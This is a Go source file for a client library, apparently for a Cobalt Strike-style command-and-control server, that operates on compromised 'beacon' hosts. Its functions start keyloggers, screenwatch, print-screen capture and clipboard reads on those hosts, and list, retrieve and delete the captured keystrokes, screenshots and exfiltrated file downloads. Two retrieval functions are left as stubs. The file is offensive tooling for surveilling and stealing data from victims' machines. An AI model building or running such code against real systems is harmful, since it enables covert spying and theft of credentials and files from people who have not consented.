package csclient

import (
	"context"
	"fmt"
	"time"
)

// --- Capture Data DTOs ---

// KeypressDto represents a single keypress event
type KeypressDto struct {
	Title    string `json:"title"`
	Keypress string `json:"keypress"`
}

// KeystrokeDto represents keystroke data captured from a beacon
type KeystrokeDto struct {
	ID         string        `json:"id"`
	BID        string        `json:"bid"`
	Keystrokes []KeypressDto `json:"keystrokes"`
	Session    int           `json:"session"`
	Host       string        `json:"host"`
	Title      string        `json:"title"`
	User       string        `json:"user"`
	Timestamp  time.Time     `json:"timestamp"`
}

// ScreenshotDto represents screenshot metadata
type ScreenshotDto struct {
	ID        string `json:"id"`
	BID       string `json:"bid"`
	User      string `json:"user"`
	Computer  string `json:"computer"`
	Timestamp int64  `json:"timestamp"`
	Title     string `json:"title"`
}

// DownloadDto represents a file download request
type DownloadDto struct {
	Path string `json:"path"`
}

// DownloadProgressDto represents an active download's progress
type DownloadProgressDto struct {
	Name     string `json:"name"`
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	Received int64  `json:"received"`
}

// FileDownloadCancelDto represents a request to cancel a file download
type FileDownloadCancelDto struct {
	File string `json:"file"` // Filename to cancel. Wildcards are OK.
}

// --- Capture Operations ---

// SpawnKeylogger starts a keylogger by spawning a new process
// The keylogger is implemented as a job and can be stopped using jobkill or JobStop
func (c *Client) SpawnKeylogger(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/keylogger", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to start keylogger: %w", err)
	}
	return &resp, nil
}

// SpawnScreenwatch starts screenwatch by spawning a new process
// Screenwatch sends a screenshot per beacon check-in until terminated
// Implemented as a job and can be stopped using jobkill or JobStop
func (c *Client) SpawnScreenwatch(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/screenwatch", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to start screenwatch: %w", err)
	}
	return &resp, nil
}

// SpawnPrintScreen captures a screenshot by injecting into a spawned process
// Sends a PrintScr keypress and grabs the screenshot from clipboard
func (c *Client) SpawnPrintScreen(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/printscreen", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to capture print screen: %w", err)
	}
	return &resp, nil
}

// Clipboard gets text from the clipboard contents
func (c *Client) Clipboard(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/clipboard", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to get clipboard: %w", err)
	}
	return &resp, nil
}

// --- Keystroke Data Management ---

// ListKeystrokes retrieves all keystroke data from the inventory
func (c *Client) ListKeystrokes(ctx context.Context) ([]KeystrokeDto, error) {
	var keystrokes []KeystrokeDto
	if err := c.doRequest(ctx, "GET", "/api/v1/data/keystrokes", nil, &keystrokes, true); err != nil {
		return nil, fmt.Errorf("failed to list keystrokes: %w", err)
	}
	return keystrokes, nil
}

// DeleteKeystrokes deletes a specified keystroke entry from the inventory
func (c *Client) DeleteKeystrokes(ctx context.Context, id string) error {
	endpoint := fmt.Sprintf("/api/v1/data/keystrokes/%s", id)
	if err := c.doRequest(ctx, "DELETE", endpoint, nil, nil, true); err != nil {
		return fmt.Errorf("failed to delete keystrokes: %w", err)
	}
	return nil
}

// --- Screenshot Data Management ---

// ListScreenshots retrieves all screenshot metadata from the data model
func (c *Client) ListScreenshots(ctx context.Context) ([]ScreenshotDto, error) {
	var screenshots []ScreenshotDto
	if err := c.doRequest(ctx, "GET", "/api/v1/data/screenshots", nil, &screenshots, true); err != nil {
		return nil, fmt.Errorf("failed to list screenshots: %w", err)
	}
	return screenshots, nil
}

// GetScreenshot retrieves a screenshot by ID (returns raw image data)
// Note: Returns StreamingResponseBody - handle the response body directly
func (c *Client) GetScreenshot(ctx context.Context, id string) ([]byte, error) {
	_ = fmt.Sprintf("/api/v1/data/screenshots/%s", id)
	// This endpoint returns raw image data, not JSON
	// For now, return error indicating this needs special handling
	return nil, fmt.Errorf("GetScreenshot requires special handling for binary data - use HTTP client directly")
}

// DeleteScreenshot deletes a specified screenshot from the data model
func (c *Client) DeleteScreenshot(ctx context.Context, id string) error {
	endpoint := fmt.Sprintf("/api/v1/data/screenshots/%s", id)
	if err := c.doRequest(ctx, "DELETE", endpoint, nil, nil, true); err != nil {
		return fmt.Errorf("failed to delete screenshot: %w", err)
	}
	return nil
}

// --- Download Management ---

// ListDownloads retrieves all downloaded files from the downloads data model
func (c *Client) ListDownloads(ctx context.Context) ([]DownloadDto, error) {
	var downloads []DownloadDto
	if err := c.doRequest(ctx, "GET", "/api/v1/data/downloads", nil, &downloads, true); err != nil {
		return nil, fmt.Errorf("failed to list downloads: %w", err)
	}
	return downloads, nil
}

// GetDownload retrieves a download by ID (returns raw file data)
// Note: Returns StreamingResponseBody - handle the response body directly
func (c *Client) GetDownload(ctx context.Context, id string) ([]byte, error) {
	_ = fmt.Sprintf("/api/v1/data/downloads/%s", id)
	// This endpoint returns raw file data, not JSON
	// For now, return error indicating this needs special handling
	return nil, fmt.Errorf("GetDownload requires special handling for binary data - use HTTP client directly")
}

// DeleteDownload deletes a specified download from the data model
func (c *Client) DeleteDownload(ctx context.Context, id string) error {
	endpoint := fmt.Sprintf("/api/v1/data/downloads/%s", id)
	if err := c.doRequest(ctx, "DELETE", endpoint, nil, nil, true); err != nil {
		return fmt.Errorf("failed to delete download: %w", err)
	}
	return nil
}

// ListActiveDownloads retrieves file downloads currently in progress for a beacon
func (c *Client) ListActiveDownloads(ctx context.Context, bid string) ([]DownloadProgressDto, error) {
	var downloads []DownloadProgressDto
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/activeDownloads", bid)
	if err := c.doRequest(ctx, "GET", endpoint, nil, &downloads, true); err != nil {
		return nil, fmt.Errorf("failed to list active downloads: %w", err)
	}
	return downloads, nil
}

// CancelFileDownload cancels a download that is currently in progress
// file parameter can include wildcards
func (c *Client) CancelFileDownload(ctx context.Context, bid string, file string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/cancelFileDownload", bid)
	req := FileDownloadCancelDto{File: file}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to cancel file download: %w", err)
	}
	return &resp, nil
}
